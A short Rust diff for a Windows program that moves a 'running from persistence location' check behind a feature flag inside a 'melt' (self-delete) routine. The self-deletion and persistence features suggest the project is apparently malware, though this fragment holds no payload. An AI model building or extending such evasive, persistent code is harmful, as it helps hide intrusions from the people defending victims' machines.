@@ -1,4 +1,3 @@
-use crate::recovery::persistence::is_running_from_persistence;
 use crate::recovery::settings::RecoveryControl;
 use std::ffi::c_void;
 use std::mem::size_of;
@@ -11,13 +10,23 @@ use windows::Win32::Storage::FileSystem::{
 };
 use windows::core::PCWSTR;
 
+#[cfg(feature = "persistence")]
+fn check_persistence() -> bool {
+    crate::recovery::persistence::is_running_from_persistence()
+}
+
+#[cfg(not(feature = "persistence"))]
+fn check_persistence() -> bool {
+    false
+}
+
 pub fn perform_melt() {
     if !RecoveryControl::global().melt_enabled() {
         debug!("melt (self-delete) is disabled");
         return;
     }
 
-    if is_running_from_persistence() {
+    if check_persistence() {
         debug!("running from persistence location, skipping melt");
         return;
     }
